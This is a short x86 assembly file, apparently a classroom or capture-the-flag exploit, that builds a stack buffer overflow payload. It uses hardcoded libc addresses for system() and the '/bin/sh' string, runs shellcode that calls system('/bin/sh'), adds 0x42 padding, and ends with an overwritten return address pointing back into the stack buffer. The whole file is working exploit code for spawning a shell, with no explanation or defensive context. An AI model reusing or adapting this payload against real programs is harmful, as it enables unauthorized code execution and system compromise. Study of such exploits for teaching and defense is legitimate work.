        .intel_syntax noprefix

        .set stack_buffer, 0xbffffd40
        .set binsh,        0xb7f8cc58 // "/bin/sh" in libc
        .set libc_system,  0xb7e6b060 // system(3) in libc

        .section .rodata

shellcode_start:
        mov  DWORD PTR [esp], binsh
        mov  eax, libc_system
        call eax

shellcode_end:
        .rept 23 - (shellcode_end - shellcode_start)
        .byte 0x42
        .endr

        .int stack_buffer + 40 // skip argv[1]
